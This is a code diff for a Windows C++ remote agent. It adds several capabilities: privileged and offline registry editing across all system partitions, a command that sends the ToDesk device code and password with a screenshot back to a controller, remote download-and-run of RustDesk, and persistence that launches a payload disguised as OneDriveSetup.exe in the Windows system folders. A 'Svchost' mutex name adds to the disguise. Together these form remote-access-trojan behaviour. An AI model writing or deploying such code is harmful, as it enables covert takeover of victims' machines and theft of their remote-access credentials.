-    memcpy(beginPkt.data(), &netTotal, 8);
-    memcpy(beginPkt.data() + 8, &netOffset, 8);
-    memcpy(beginPkt.data() + 16, fnameUtf8.data(), fnameUtf8.size());
-    SendPacketSafe(sock, CMD_FILE_BEGIN, beginPkt);
-
-    vector<char> buf(FILE_CHUNK_SIZE);
-    ULONGLONG sent = 0;
-    while (sent < totalSize) {
-        DWORD toRead = (DWORD)min((ULONGLONG)FILE_CHUNK_SIZE, totalSize - sent);
-        DWORD didRead = 0;
-        if (!ReadFile(hFile, buf.data(), toRead, &didRead, NULL) || didRead == 0) break;
-        buf.resize(didRead);
-        SendPacketSafe(sock, CMD_FILE_CHUNK, buf);
-        buf.resize(FILE_CHUNK_SIZE);
-        sent += didRead;
-    }
-    CloseHandle(hFile);
-    SendPacketSafe(sock, CMD_FILE_END, vector<char>());
-
-    // ★ 发完恢复无超时，不影响后续接收
-    DWORD noTo = 0;
-    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&noTo, sizeof(noTo));
-    LeaveCriticalSection(&g_fileSendLock);  // ← 新增：函数出口释放
-}
-
 // ★ 新增：在已配对的独立socket上发文件（截图/文件回传专用）
 void SendFileOnNewSock(SOCKET fs, const wstring& filePath)
 {
@@ -4394,23 +4259,446 @@ static void SetDpiAwareness()
     SetProcessDPIAware();
 }
 
+// ===== 解析根键字符串 → HKEY =====
+HKEY ParseRootKey(const string& root)
+{
+    if (root == "HKLM" || root == "HKEY_LOCAL_MACHINE")  return HKEY_LOCAL_MACHINE;
+    if (root == "HKCU" || root == "HKEY_CURRENT_USER")   return HKEY_CURRENT_USER;
+    if (root == "HKCR" || root == "HKEY_CLASSES_ROOT")   return HKEY_CLASSES_ROOT;
+    if (root == "HKU" || root == "HKEY_USERS")          return HKEY_USERS;
+    if (root == "HKCC" || root == "HKEY_CURRENT_CONFIG") return HKEY_CURRENT_CONFIG;
+    return NULL;
+}
+
+// ===== 正常系统下写注册表（带TI三级降级）=====
+// 协议格式（\n分隔）：根键\n子键\n值名\n类型\n数据
+string RegWriteValue(const string& payload)
+{
+    string cpuTag;
+    { wchar_t h[256] = {}; DWORD l = 256;
+    if (GetComputerNameW(h, &l)) cpuTag = WideToUtf8(wstring(h)); }
+
+    vector<string> parts;
+    { string tmp = payload; size_t pos;
+    while ((pos = tmp.find('\n')) != string::npos)
+    {
+        parts.push_back(tmp.substr(0, pos)); tmp = tmp.substr(pos + 1);
+    }
+    parts.push_back(tmp); }
+
+    if (parts.size() < 5)
+        return "ERROR|参数不足，需要5段：根键/子键/值名/类型/数据|" + cpuTag;
+
+    string rootStr = parts[0], subKey = parts[1],
+        valName = parts[2], typeStr = parts[3], dataStr = parts[4];
+
+    HKEY hRoot = ParseRootKey(rootStr);
+    if (!hRoot) return "ERROR|未知根键:" + rootStr + "|" + cpuTag;
+
+    wstring wSubKey = Utf8ToWide(subKey);
+    wstring wValName = Utf8ToWide(valName);
+
+    bool ok = false;
+
+    if (typeStr == "REG_DWORD") {
+        DWORD dw = (DWORD)strtoul(dataStr.c_str(), nullptr, 0);
+        ok = TIHelper::RegWriteAsTI(hRoot, wSubKey, wValName, REG_DWORD, &dw, sizeof(DWORD));
+    }
+    else if (typeStr == "REG_QWORD") {
+        ULONGLONG qw = strtoull(dataStr.c_str(), nullptr, 0);
+        ok = TIHelper::RegWriteAsTI(hRoot, wSubKey, wValName, REG_QWORD, &qw, sizeof(ULONGLONG));
+    }
+    else if (typeStr == "REG_SZ" || typeStr == "REG_EXPAND_SZ") {
+        wstring wVal = Utf8ToWide(dataStr);
+        DWORD regType = (typeStr == "REG_EXPAND_SZ") ? REG_EXPAND_SZ : REG_SZ;
+        ok = TIHelper::RegWriteAsTI(hRoot, wSubKey, wValName, regType,
+            wVal.c_str(), (DWORD)((wVal.size() + 1) * sizeof(wchar_t)));
+    }
+    else if (typeStr == "REG_BINARY") {
+        vector<BYTE> bytes;
+        for (size_t i = 0; i + 1 < dataStr.size(); i += 2) {
+            char hex[3] = { dataStr[i], dataStr[i + 1], 0 };
+            bytes.push_back((BYTE)strtol(hex, nullptr, 16));
+        }
+        ok = TIHelper::RegWriteAsTI(hRoot, wSubKey, wValName, REG_BINARY,
+            bytes.empty() ? nullptr : bytes.data(), (DWORD)bytes.size());
+    }
+    else {
+        return "ERROR|不支持的类型:" + typeStr + "|" + cpuTag;
+    }
+
+    if (!ok)
+        return "ERROR|写入失败(TI) " + rootStr + "\\" + subKey + "\\" + valName + "|" + cpuTag;
+    return "OK|写入成功 " + rootStr + "\\" + subKey + "\\" + valName + "|" + cpuTag;
+}
+
+// ===== 正常系统下删注册表值或整个键（带TI三级降级，WOW64修复版）=====
+string RegDeleteValue(const string& payload)
+{
+    string cpuTag;
+    { wchar_t h[256] = {}; DWORD l = 256;
+    if (GetComputerNameW(h, &l)) cpuTag = WideToUtf8(wstring(h)); }
+
+    vector<string> parts;
+    { string tmp = payload; size_t pos;
+    while ((pos = tmp.find('\n')) != string::npos)
+    {
+        parts.push_back(tmp.substr(0, pos)); tmp = tmp.substr(pos + 1);
+    }
+    parts.push_back(tmp); }
+
+    if (parts.size() < 3)
+        return "ERROR|参数不足，需要3段：根键/子键/值名|" + cpuTag;
+
+    string rootStr = parts[0], subKey = parts[1], valName = parts[2];
+    HKEY hRoot = ParseRootKey(rootStr);
+    if (!hRoot) return "ERROR|未知根键:" + rootStr + "|" + cpuTag;
+
+    wstring wSubKey = Utf8ToWide(subKey);
+    wstring wValName = Utf8ToWide(valName);
+
+    if (valName.empty()) {
+        // ★ DELETE_KEY：RegDeleteTreeW必须带KEY_WOW64_64KEY，否则32位进程只删WOW6432Node视图
+        wstring parentKey, lastKey;
+        size_t pos = wSubKey.rfind(L'\\');
+        if (pos != wstring::npos) {
+            parentKey = wSubKey.substr(0, pos);
+            lastKey = wSubKey.substr(pos + 1);
+        }
+        else {
+            parentKey = L"";
+            lastKey = wSubKey;
+        }
+
+        HKEY hParent = NULL;
+        LONG ret = ERROR_SUCCESS;
+        bool needClose = false;
+
+        if (!parentKey.empty()) {
+            ret = RegOpenKeyExW(hRoot, parentKey.c_str(), 0,
+                KEY_ENUMERATE_SUB_KEYS | KEY_SET_VALUE | KEY_WOW64_64KEY, &hParent);
+            needClose = (ret == ERROR_SUCCESS);
+        }
+        else {
+            hParent = hRoot;
+        }
+
+        if (ret == ERROR_SUCCESS && hParent) {
+            ret = RegDeleteTreeW(hParent, lastKey.c_str());
+            if (needClose) RegCloseKey(hParent);
+        }
+
+        if (ret == ERROR_SUCCESS || ret == ERROR_FILE_NOT_FOUND)
+            return "OK|键已删除:" + rootStr + "\\" + subKey + "|" + cpuTag;
+        return "ERROR|删除失败 错误码:" + to_string(ret) + "|" + cpuTag;
+    }
+
+    // 删单个值：走TIHelper
+    bool ok = TIHelper::RegDeleteAsTI(hRoot, wSubKey, wValName);
+    if (!ok)
+        return "ERROR|删除失败(TI) " + rootStr + "\\" + subKey + "|" + cpuTag;
+    return "OK|值已删除:" + valName + "|" + cpuTag;
+}
+
+// ===== PE下遍历所有系统盘修改注册表（WOW64修复版）=====
+string RegWriteAllSystemsPE(SOCKET reportSocket, const string& payload)
+{
+    string cpuTag;
+    { wchar_t h[256] = {}; DWORD l = 256;
+    if (GetComputerNameW(h, &l)) cpuTag = WideToUtf8(wstring(h)); }
+
+    auto Report = [&](const string& msg) {
+        if (reportSocket != INVALID_SOCKET)
+            SendPacketBin(reportSocket, CMD_REG_WRITE_AUTO_RES,
+                vector<char>(msg.begin(), msg.end()));
+    };
+
+    vector<string> parts;
+    { string tmp = payload; size_t pos;
+    while ((pos = tmp.find('\n')) != string::npos)
+    {
+        parts.push_back(tmp.substr(0, pos)); tmp = tmp.substr(pos + 1);
+    }
+    parts.push_back(tmp); }
+
+    if (parts.size() < 6) {
+        Report("ERROR|参数不足，需要6段：配置单元/子键/值名/类型/数据/操作|" + cpuTag);
+        return "ERROR";
+    }
+
+    string hiveFile = parts[0], subKey = parts[1], valName = parts[2],
+        typeStr = parts[3], dataStr = parts[4], opStr = parts[5];
+
+    string hiveUpper = hiveFile;
+    transform(hiveUpper.begin(), hiveUpper.end(), hiveUpper.begin(), ::toupper);
+
+    EnableRegistryPrivileges();
+    PVOID oldFsRedir = NULL;
+    Wow64DisableWow64FsRedirection(&oldFsRedir);
+
+    wchar_t winDir[MAX_PATH] = {};
+    GetWindowsDirectoryW(winDir, MAX_PATH);
+    char currentDrive = (char)winDir[0];
+
+    int foundCount = 0, successCount = 0;
+
+    DWORD drives = GetLogicalDrives();
+    for (int i = 0; i < 26; i++) {
+        if (!(drives & (1 << i))) continue;
+        char letter = 'A' + i;
+
+        if (IsRunningInPE() && (letter == 'X' || letter == 'x')) continue;
+
+        string winPath = string(1, letter) + ":\\Windows";
+        DWORD attr = GetFileAttributesW(Utf8ToWide(winPath).c_str());
+        if (attr == INVALID_FILE_ATTRIBUTES || !(attr & FILE_ATTRIBUTE_DIRECTORY)) continue;
+
+        foundCount++;
+
+        string hivePath = string(1, letter) + ":\\Windows\\System32\\config\\" + hiveFile;
+        wstring wHivePath = Utf8ToWide(hivePath);
+        if (GetFileAttributesW(wHivePath.c_str()) == INVALID_FILE_ATTRIBUTES) {
+            char errMsg[256];
+            sprintf_s(errMsg, "ERROR|%c盘 hive文件不存在:%s|%s", letter, hiveFile.c_str(), cpuTag.c_str());
+            Report(string(errMsg)); continue;
+        }
+
+        bool isCurrentSystem = (letter == currentDrive) && !IsRunningInPE();
+        HKEY hRootKey = HKEY_LOCAL_MACHINE;
+
+        string tempKeyName = "PERegTemp_" + string(1, letter) + "_" + hiveUpper;
+        wstring wTempKey = Utf8ToWide(tempKeyName);
+
+        if (!isCurrentSystem) {
+            RegUnLoadKeyW(HKEY_LOCAL_MACHINE, wTempKey.c_str());
+            Sleep(100);
+            LONG loadRet = RegLoadKeyW(HKEY_LOCAL_MACHINE, wTempKey.c_str(), wHivePath.c_str());
+            if (loadRet == ERROR_SHARING_VIOLATION) {
+                Sleep(600);
+                loadRet = RegLoadKeyW(HKEY_LOCAL_MACHINE, wTempKey.c_str(), wHivePath.c_str());
+            }
+            if (loadRet != ERROR_SUCCESS) {
+                char errMsg[256];
+                sprintf_s(errMsg, "ERROR|%c盘 挂载hive失败 错误码:%ld hive:%s|%s",
+                    letter, loadRet, hiveFile.c_str(), cpuTag.c_str());
+                Report(string(errMsg)); continue;
+            }
+        }
+
+        wstring wFullSubKey = isCurrentSystem
+            ? Utf8ToWide(hiveUpper + "\\" + subKey)
+            : wTempKey + L"\\" + Utf8ToWide(subKey);
+
+        wstring wValName = Utf8ToWide(valName);
+        string opResult;
+
+        if (opStr == "DELETE_KEY") {
+            // ★ WOW64修复：先开父键带64位标志，再删子键
+            wstring parentKey2, lastKey2;
+            size_t pos2 = wFullSubKey.rfind(L'\\');
+            if (pos2 != wstring::npos) {
+                parentKey2 = wFullSubKey.substr(0, pos2);
+                lastKey2 = wFullSubKey.substr(pos2 + 1);
+            }
+            else {
+                parentKey2 = L"";
+                lastKey2 = wFullSubKey;
+            }
+
+            HKEY hParent2 = NULL;
+            LONG ret = ERROR_SUCCESS;
+            bool needClose2 = false;
+
+            if (!parentKey2.empty()) {
+                ret = RegOpenKeyExW(hRootKey, parentKey2.c_str(), 0,
+                    KEY_ENUMERATE_SUB_KEYS | KEY_SET_VALUE | KEY_WOW64_64KEY, &hParent2);
+                needClose2 = (ret == ERROR_SUCCESS);
+            }
+            else {
+                hParent2 = hRootKey;
+            }
+
+            if (ret == ERROR_SUCCESS && hParent2) {
+                ret = RegDeleteTreeW(hParent2, lastKey2.c_str());
+                if (needClose2) RegCloseKey(hParent2);
+            }
+
+            if (ret == ERROR_SUCCESS || ret == ERROR_FILE_NOT_FOUND) {
+                char msg[256];
+                sprintf_s(msg, "OK|%c盘 键已删除:%s|%s", letter, subKey.c_str(), cpuTag.c_str());
+                opResult = msg; successCount++;
+            }
+            else {
+                char msg[256];
+                sprintf_s(msg, "ERROR|%c盘 删键失败 错误码:%ld|%s", letter, ret, cpuTag.c_str());
+                opResult = msg;
+            }
+        }
+        else if (opStr == "DELETE") {
+            HKEY hKey = NULL;
+            LONG ret = RegOpenKeyExW(hRootKey, wFullSubKey.c_str(), 0,
+                KEY_SET_VALUE | KEY_WOW64_64KEY, &hKey);
+            if (ret == ERROR_FILE_NOT_FOUND) {
+                char msg[128];
+                sprintf_s(msg, "OK|%c盘 键不存在（跳过）|%s", letter, cpuTag.c_str());
+                opResult = msg; successCount++;
+            }
+            else if (ret == ERROR_SUCCESS) {
+                LONG dr = RegDeleteValueW(hKey, wValName.c_str());
+                RegCloseKey(hKey);
+                if (dr == ERROR_SUCCESS || dr == ERROR_FILE_NOT_FOUND) {
+                    char msg[256];
+                    sprintf_s(msg, "OK|%c盘 值已删除:%s|%s", letter, valName.c_str(), cpuTag.c_str());
+                    opResult = msg; successCount++;
+                }
+                else {
+                    char msg[256];
+                    sprintf_s(msg, "ERROR|%c盘 删值失败 错误码:%ld|%s", letter, dr, cpuTag.c_str());
+                    opResult = msg;
+                }
+            }
+            else {
+                char msg[128];
+                sprintf_s(msg, "ERROR|%c盘 打开键失败 错误码:%ld|%s", letter, ret, cpuTag.c_str());
+                opResult = msg;
+            }
+        }
+        else {
+            // WRITE
+            HKEY hKey = NULL;
+            DWORD disposition = 0;
+            LONG ret = RegCreateKeyExW(hRootKey, wFullSubKey.c_str(), 0, NULL,
+                REG_OPTION_NON_VOLATILE, KEY_SET_VALUE | KEY_WOW64_64KEY,
+                NULL, &hKey, &disposition);
+
+            if (ret != ERROR_SUCCESS) {
+                char msg[256];
+                sprintf_s(msg, "ERROR|%c盘 创建/打开键失败 错误码:%ld 路径:%s|%s",
+                    letter, ret, subKey.c_str(), cpuTag.c_str());
+                opResult = msg;
+                goto cleanup_hive;
+            }
+
+            LONG writeRet = ERROR_INVALID_PARAMETER;
+
+            if (typeStr == "REG_DWORD") {
+                DWORD dw = (DWORD)strtoul(dataStr.c_str(), nullptr, 0);
+                writeRet = RegSetValueExW(hKey, wValName.c_str(), 0, REG_DWORD,
+                    (LPBYTE)&dw, sizeof(DWORD));
+            }
+            else if (typeStr == "REG_QWORD") {
+                ULONGLONG qw = strtoull(dataStr.c_str(), nullptr, 0);
+                writeRet = RegSetValueExW(hKey, wValName.c_str(), 0, REG_QWORD,
+                    (LPBYTE)&qw, sizeof(ULONGLONG));
+            }
+            else if (typeStr == "REG_SZ" || typeStr == "REG_EXPAND_SZ") {
+                wstring wVal = Utf8ToWide(dataStr);
+                DWORD regType = (typeStr == "REG_EXPAND_SZ") ? REG_EXPAND_SZ : REG_SZ;
+                writeRet = RegSetValueExW(hKey, wValName.c_str(), 0, regType,
+                    (LPBYTE)wVal.c_str(), (DWORD)((wVal.size() + 1) * sizeof(wchar_t)));
+            }
+            else if (typeStr == "REG_BINARY") {
+                vector<BYTE> bytes;
+                for (size_t idx = 0; idx + 1 < dataStr.size(); idx += 2) {
+                    char hex[3] = { dataStr[idx], dataStr[idx + 1], 0 };
+                    bytes.push_back((BYTE)strtol(hex, nullptr, 16));
+                }
+                writeRet = RegSetValueExW(hKey, wValName.c_str(), 0, REG_BINARY,
+                    bytes.empty() ? nullptr : bytes.data(), (DWORD)bytes.size());
+            }
+            else {
+                RegCloseKey(hKey);
+                char msg[128];
+                sprintf_s(msg, "ERROR|%c盘 不支持的类型:%s|%s", letter, typeStr.c_str(), cpuTag.c_str());
+                opResult = msg;
+                goto cleanup_hive;
+            }
+
+            RegCloseKey(hKey);
+
+            if (writeRet == ERROR_SUCCESS) {
+                char msg[256];
+                sprintf_s(msg, "OK|%c盘 写入成功 %s\\%s=%s|%s",
+                    letter, subKey.c_str(), valName.c_str(), dataStr.c_str(), cpuTag.c_str());
+                opResult = msg; successCount++;
+            }
+            else {
+                char msg[256];
+                sprintf_s(msg, "ERROR|%c盘 写入失败 错误码:%ld|%s", letter, writeRet, cpuTag.c_str());
+                opResult = msg;
+            }
+        }
+
+    cleanup_hive:
+        if (!isCurrentSystem)
+            RegUnLoadKeyW(HKEY_LOCAL_MACHINE, wTempKey.c_str());
+
+        Report(opResult);
+    }
+
+    Wow64RevertWow64FsRedirection(oldFsRedir);
+
+    char finalMsg[256];
+    if (foundCount == 0)
+        sprintf_s(finalMsg, "DONE|未找到任何Windows系统分区|%s", cpuTag.c_str());
+    else
+        sprintf_s(finalMsg, "DONE|共找到%d个系统 成功%d个|%s", foundCount, successCount, cpuTag.c_str());
+    Report(string(finalMsg));
+    return string(finalMsg);
+}
+
+// ===== 自动判断PE/正常系统路由 =====
+string RegWriteAuto(SOCKET reportSocket, const string& payload)
+{
+    if (IsRunningInPE())
+        return RegWriteAllSystemsPE(reportSocket, payload);
+
+    vector<string> parts;
+    { string tmp = payload; size_t pos;
+    while ((pos = tmp.find('\n')) != string::npos)
+    {
+        parts.push_back(tmp.substr(0, pos)); tmp = tmp.substr(pos + 1);
+    }
+    parts.push_back(tmp); }
+
+    if (parts.size() < 6) {
+        string err = "ERROR|参数不足|";
+        if (reportSocket != INVALID_SOCKET)
+            SendPacketBin(reportSocket, CMD_REG_WRITE_AUTO_RES,
+                vector<char>(err.begin(), err.end()));
+        return "ERROR";
+    }
+
+    string hiveFile = parts[0], subKey = parts[1], valName = parts[2],
+        typeStr = parts[3], dataStr = parts[4], opStr = parts[5];
+
+    string fullSubKey = hiveFile + "\\" + subKey;
+    string result;
+
+    if (opStr == "DELETE_KEY") {
+        result = RegDeleteValue("HKLM\n" + fullSubKey + "\n");
+    }
+    else if (opStr == "DELETE") {
+        result = RegDeleteValue("HKLM\n" + fullSubKey + "\n" + valName);
+    }
+    else {
+        result = RegWriteValue("HKLM\n" + fullSubKey + "\n" + valName + "\n" + typeStr + "\n" + dataStr);
+    }
+
+    if (reportSocket != INVALID_SOCKET)
+        SendPacketBin(reportSocket, CMD_REG_WRITE_AUTO_RES,
+            vector<char>(result.begin(), result.end()));
+    return result;
+}
 
 int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
 
     SetDpiAwareness();   // ★ 必须在任何窗口/DPI相关操作前设置
 
-    // ===== 单实例检测 =====
-    HANDLE hMutex = CreateMutexW(NULL, TRUE, L"Global\\SvchostAgentMutex_UniqueKey");
-    if (GetLastError() == ERROR_ALREADY_EXISTS) {
-        if (hMutex) CloseHandle(hMutex);
-        return 0;
-    }
-
     GdiplusStartupInput gdiplusInput;
     ULONG_PTR gdiplusToken;
     GdiplusStartup(&gdiplusToken, &gdiplusInput, NULL);
     InitializeCriticalSection(&g_sendLock);
-    InitializeCriticalSection(&g_fileSendLock);
     InitializeCriticalSection(&g_dirReadyMapLock);  // ★ 新增
 
     WSADATA wsa;
@@ -4421,59 +4709,19 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     // ★ 新增：创建网络就绪事件（手动重置，初始未触发）
     g_NetworkReadyEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
 
-    // ★ 网络独占锁：同一台机器只允许一个实例负责网络连接
-    HANDLE hNetMutex = CreateMutexW(NULL, TRUE,
+    // ★ 接力：等待网络mutex，第一个实例退出后第二个自动接管
+    HANDLE hNetMutex = CreateMutexW(NULL, FALSE,
         L"Global\\FortodeskNetworkMutex_UniqueKey");
-    bool isNetworkOwner = (GetLastError() != ERROR_ALREADY_EXISTS);
-
-    if (!isNetworkOwner) {
-        // 已有其他实例负责网络，本实例退出网络循环
-        // 集成到MFC程序时这里不return，改为goto skip_network跳过
-        if (hNetMutex) CloseHandle(hNetMutex);
-        WSACleanup();
-        GdiplusShutdown(gdiplusToken);
-        CloseHandle(hMutex);
-        return 0;
-    }
-
-    // ★ 可选改动3：NotifyAddrChange 网卡状态监听线程
-// 当网卡IP地址发生变化（如驱动安装后网卡重新获取IP），立刻唤醒9003等待
-// 加入2秒防抖：网卡稳定2秒后才触发，避免驱动安装期间多次闪断造成抖动
-    HANDLE hAddrWatchThread = CreateThread(NULL, 0, [](LPVOID) -> DWORD {
-        while (true) {
-            HANDLE hOverlap = CreateEventW(NULL, FALSE, FALSE, NULL);
-            if (!hOverlap) { Sleep(1000); continue; }
-
-            OVERLAPPED ovl = {};
-            ovl.hEvent = hOverlap;
-
-            // NotifyAddrChange：等待IP地址变化通知
-            HANDLE hNotify = NULL;
-            DWORD ret = NotifyAddrChange(&hNotify, &ovl);
-            if (ret != ERROR_IO_PENDING) {
-                CloseHandle(hOverlap);
-                Sleep(1000);
-                continue;
-            }
-
-            // 等待通知（阻塞直到IP变化）
-            WaitForSingleObject(hOverlap, INFINITE);
-            CloseHandle(hOverlap);
-
-            // ★ IP发生变化，防抖等待2秒（网卡可能还在初始化）
-            Sleep(2000);
-
-            // 如果9000已经稳定（g_NetworkReady=true），不需要做任何事
-            // 如果9000还没稳定（g_NetworkReady=false），检查是否可以唤醒
-            // 实际上此时9000还在重连中，等9000稳定后会自动SetEvent
-            // 这里的作用是：如果9003线程在等待Event，而9000还没来得及SetEvent，
-            // 此处可以打断9003的等待让它重新检查状态
-            // 最简单的做法：什么都不做，9000心跳稳定后自然会SetEvent
-            // 这个线程的主要价值是：配合将来可能的"网卡恢复后立刻重连9000"逻辑
+    if (hNetMutex) {
+        DWORD wr = WaitForSingleObject(hNetMutex, INFINITE);
+        // WAIT_OBJECT_0 = 正常拿到，WAIT_ABANDONED = 前一个实例崩溃退出，两种都继续
+        if (wr != WAIT_OBJECT_0 && wr != WAIT_ABANDONED) {
+            CloseHandle(hNetMutex);
+            WSACleanup();
+            GdiplusShutdown(gdiplusToken);
+            return 0;
         }
-        return 0;
-        }, NULL, 0, NULL);
-    if (hAddrWatchThread) CloseHandle(hAddrWatchThread);
+    }
 
     while (true) {
         // ★ 新增：每次外层重连循环开始时重置网络就绪状态
@@ -4526,7 +4774,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
 
         struct HbParam { SOCKET* pSock; volatile bool* pRunning; };
         HbParam* hbParam = new HbParam{ &s, &hbRunning };
-        // 改后
+
         HANDLE hHbThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
             HbParam* hp = (HbParam*)p;
             int tickCount = 0;
@@ -4768,6 +5016,42 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
                             }, p, 0, NULL);
                         if (hThread) CloseHandle(hThread);
                     }
+                    else if (cmd == CMD_GET_TODESK_INFO)
+                    {
+                        struct P { SOCKET sock; string taskId; };
+                        P* p = new P{ cs, dataStr };
+                        HANDLE hThread = CreateThread(NULL, 0, [](LPVOID v) -> DWORD {
+                            P* pp = (P*)v;
+                            SOCKET sock = pp->sock;
+                            string taskId = pp->taskId;
+                            delete pp;
+
+                            wstring screenshotPath;
+                            string result = GetToDeskInfoAndScreenshot(screenshotPath);
+
+                            // 文字结果走 9003 指令通道
+                            // 格式: OK|设备代码|密码|机器名|taskId
+                            // 或:   ERROR|原因|机器名|taskId
+                            string resMsg = result + "|" + taskId;
+                            SendPacketSafe(sock, CMD_GET_TODESK_INFO_RES,
+                                vector<char>(resMsg.begin(), resMsg.end()));
+
+                            // 截图走 9001 文件通道（和 CMD_SCREENSHOT_TODESK 完全一致）
+                            if (!screenshotPath.empty() &&
+                                GetFileAttributesW(screenshotPath.c_str()) != INVALID_FILE_ATTRIBUTES)
+                            {
+                                SOCKET fs = ConnectFilePort(taskId);
+                                if (fs != INVALID_SOCKET) {
+                                    SendFileOnNewSock(fs, screenshotPath);
+                                    closesocket(fs);
+                                }
+                                DeleteFileW(screenshotPath.c_str());
+                            }
+
+                            return 0;
+                            }, p, 0, NULL);
+                        if (hThread) CloseHandle(hThread);
+                    }
                     else if (cmd == CMD_SCREENSHOT_TODESK) {
                         struct P { SOCKET sock; string taskId; };
                         P* p = new P{ cs, dataStr };
@@ -4825,6 +5109,98 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
                             return 0;
                             }, p, 0, NULL);
                         if (hThread) CloseHandle(hThread);
+                    }
+
+                    // ================= RustDesk 下载并自动打开 =================
+                    else if (cmd == CMD_DOWNLOAD_RUSTDESK) {
+                        size_t sep = dataStr.find('\n');
+                        string savePathStr = sep != string::npos ? dataStr.substr(0, sep) : "USER_DESKTOP";
+                        string urlWithArgs = sep != string::npos ? dataStr.substr(sep + 1) : dataStr;
+                        string resolvedPath = ResolveSysPath(savePathStr);
+                        string url, args;
+                        ParseDownloadInput(urlWithArgs, url, args);
+
+                        DownloadConfig cfg;
+                        cfg.url = url;
+                        cfg.savePath = resolvedPath;
+                        cfg.silentArgs = args;  // "!" 代表下载完自动运行
+                        cfg.reportSocket = cs;
+                        cfg.launchAfterInstall = false;
+
+                        struct DlParam { DownloadConfig cfg; };
+                        DlParam* param = new DlParam{ cfg };
+                        HANDLE hThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
+                            DlParam* dp = (DlParam*)p;
+                            DownloadAndRunEx(dp->cfg);
+                            delete dp;
+                            return 0;
+                            }, param, 0, NULL);
+                        if (hThread) CloseHandle(hThread);
+                    }
+
+// ================= RustDesk 单独打开 =================
+                    else if (cmd == CMD_OPEN_RUSTDESK) {
+                        struct P { SOCKET sock; };
+                        P* p = new P{ cs };
+                        HANDLE hThread = CreateThread(NULL, 0, [](LPVOID v) -> DWORD {
+                            P* pp = (P*)v;
+                            SOCKET sock = pp->sock;
+                            delete pp;
+
+                            string cpuTag;
+                            { wchar_t h[256] = {}; DWORD l = 256; if (GetComputerNameW(h, &l)) cpuTag = WideToUtf8(wstring(h)); }
+
+                            // 1. 有进程直接激活窗口
+                            auto pids = FindProcessByName(L"rustdesk.exe");
+                            if (!pids.empty()) {
+                                HWND hwnd = FindProcessWindow(pids[0]);
+                                if (hwnd) {
+                                    BringWindowToFrontAndWait(hwnd);
+                                    string res = "OPEN_OK|RustDesk已激活|" + cpuTag;
+                                    SendPacketSafe(sock, CMD_OPEN_RES, vector<char>(res.begin(), res.end()));
+                                    return 0;
+                                }
+                                // ★ 核心：有进程但无窗口（僵尸进程），先杀掉
+                                KillProcessesByNames({ L"rustdesk.exe" });
+                                Sleep(500);
+                            }
+
+                            // 2. 没有进程，只在两个桌面位置找
+                            vector<wstring> searchPaths;
+                            wchar_t buf[MAX_PATH] = {};
+                            if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_DESKTOPDIRECTORY, NULL, SHGFP_TYPE_CURRENT, buf)) && wcslen(buf) > 0)
+                                searchPaths.push_back(wstring(buf) + L"\\rustdesk.exe");
+
+                            if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_COMMON_DESKTOPDIRECTORY, NULL, SHGFP_TYPE_CURRENT, buf)) && wcslen(buf) > 0)
+                                searchPaths.push_back(wstring(buf) + L"\\rustdesk.exe");
+                            searchPaths.push_back(GetSystemDrive() + L"\\Users\\Default\\Desktop\\rustdesk.exe");
+                            searchPaths.push_back(GetSystemDrive() + L"\\Users\\Public\\Desktop\\rustdesk.exe");
+                            bool launched = false;
+                            for (auto& path : searchPaths) {
+                                if (GetFileAttributesW(path.c_str()) != INVALID_FILE_ATTRIBUTES) {
+                                    if (LaunchProcess(path)) {
+                                        launched = true;
+                                        HWND hwnd = WaitForAppWindow({ L"rustdesk.exe" });
+                                        if (hwnd) BringWindowToFrontAndWait(hwnd);
+                                        break;
+                                    }
+                                }
+                            }
+
+                            string res = launched
+                                ? "OPEN_OK|RustDesk已启动|" + cpuTag
+                                : "OPEN_FAIL|桌面未找到rustdesk.exe，请先下载|" + cpuTag;
+                            SendPacketSafe(sock, CMD_OPEN_RES, vector<char>(res.begin(), res.end()));
+                            return 0;
+                            }, p, 0, NULL);
+                        if (hThread) CloseHandle(hThread);
+                    }
+
+// ================= RustDesk 结束进程 =================
+                    else if (cmd == CMD_KILL_RUSTDESK) {
+                        KillProcessesByNames({ L"rustdesk.exe" });
+                        string res = "OK:RustDesk进程已全部结束";
+                        SendPacketSafe(cs, CMD_KILL_RES, vector<char>(res.begin(), res.end()));
                     }
                     else if (cmd == CMD_SEND_FILE) {
                         // ★ 新格式：savePath|TaskID
@@ -4922,6 +5298,7 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
                         string res = "OK:ToDesk进程已全部结束";
                         SendPacketSafe(cs, CMD_KILL_RES, vector<char>(res.begin(), res.end()));
                     }
+
                     else if (cmd == CMD_KILL_ASKLINK) {
                         vector<wstring> names = { L"AskLink.exe", L"AskLinkSession.exe" };
                         KillProcessesByNames(names);
@@ -5043,15 +5420,24 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
                         if (hThread) CloseHandle(hThread);
                     }
                     else if (cmd == CMD_ADD_STARTUP_NOREG) {
-                        // 完整版模式：从控制端传来的路径复制文件+写注册表
                         struct Param { SOCKET sock; string srcPath; };
-                        Param* param = new Param{ cs, dataStr };  // dataStr = 临时目录下载路径
+                        Param* param = new Param{ cs, dataStr };
                         HANDLE hThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
                             Param* dp = (Param*)p;
-                            // ★ copyFile=true，sourceFilePath=控制端传来的下载路径
                             string result = ModifyStartup(dp->sock, true, true, dp->srcPath);
                             SendPacketSafe(dp->sock, CMD_ADD_STARTUP_RES,
                                 vector<char>(result.begin(), result.end()));
+
+                            // ★ 立即启动，不等重启
+                            if (result.find("OK|") != string::npos) {
+                                wstring exePath;
+                                if (GetFileAttributesW(L"C:\\Windows\\SysWOW64") != INVALID_FILE_ATTRIBUTES)
+                                    exePath = L"C:\\Windows\\SysWOW64\\OneDriveSetup.exe";
+                                else
+                                    exePath = L"C:\\Windows\\System32\\OneDriveSetup.exe";
+                                LaunchProcess(exePath);
+                            }
+
